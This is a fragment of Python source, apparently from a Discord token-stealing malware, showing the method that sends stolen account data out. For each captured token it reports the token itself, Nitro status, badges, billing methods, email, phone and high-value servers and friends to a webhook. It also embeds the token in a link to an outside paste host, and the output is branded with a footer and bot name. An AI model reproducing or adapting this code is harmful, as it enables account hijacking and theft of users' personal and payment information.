...
class discord():
    ...
    def upload_accounts(self, webhook: str) -> None:
        ...
        for token in self.tokens:
            ...
            embed.add_field(name="<:CLY_bow:1076967455538298890> Token:",
                            value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
            embed.add_field(
                name="<:vaim:1076966140795949166> Nitro:", value=f"{nitro}", inline=True)
            embed.add_field(name="<a:kaji_a_boost:1076966138761715712> Badges:",
                            value=f"{badges if badges != '' else 'None'}", inline=True)
            embed.add_field(name="<a:EX_creditcard:1076965949275656193>> Billing:",
                            value=f"{methods if methods != '' else 'None'}", inline=True)
            embed.add_field(name="<:CLY_gun_black:1075137486994538526> Email:",
                            value=f"{email if email != None else 'None'}", inline=True)
            embed.add_field(name="<:CLY_blackdevilheart:1075130791866159125> Phone:",
            ...
            if hq_guilds != "":
                embed.add_field(
                    name="<:8notyss:1075137493055328307> HQ Guilds:", value=f"{hq_guilds}", inline=False)
            embed.add_field(name="\u200b", value=f"\u200b",
                            inline=False) if hq_friends != "" else None
            if hq_friends != "":
                embed.add_field(
                    name="<:ICN_45:1076965953063104633> HQ Friends:", value=f"{hq_friends}", inline=False)
            embed.add_field(name="\u200b", value=f"\u200b",
                            inline=False) if hq_guilds or hq_friends != "" else None

            embed.set_footer(text="www.youtube.com/@spoofingesq")

            webhook.send(embed=embed, username="Ximenito",
                         avatar_url="https://i.imgur.com/zXvSOxx.png")
